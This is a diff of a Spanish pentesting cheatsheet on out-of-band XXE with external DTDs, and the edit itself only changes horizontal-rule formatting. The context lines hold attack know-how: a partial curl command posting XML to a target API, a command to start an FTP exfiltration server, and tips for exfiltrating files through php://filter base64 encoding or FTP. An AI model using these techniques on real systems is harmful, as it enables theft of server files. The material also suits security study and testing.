@@ -19,7 +19,7 @@ linked:
 ---
 # XXE - Out-of-Band (OOB) y DTDs Externos
 
-***
+---
 
 ## Cheatsheet
 
@@ -73,7 +73,7 @@ curl -X POST https://target/api -H 'Content-Type: application/xml' --data \
 ftpserver.py -p 21  # ej: github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb
 ```
 
-___
+---
 
 ## Overview
 
@@ -92,4 +92,4 @@ OOB se usa cuando hay **vulnerabilidad confirmada pero la app no refleja ni emit
 - **Saltos de línea:** archivos multilínea rompen URL HTTP en parsers modernos → wrapper `php://filter/read=convert.base64-encode/resource=` (PHP) o FTP exfil (Java/.NET).
 - **Esquemas:** `http`/`https` universal; `ftp` en Java; `gopher` raramente.
 
-***
+---
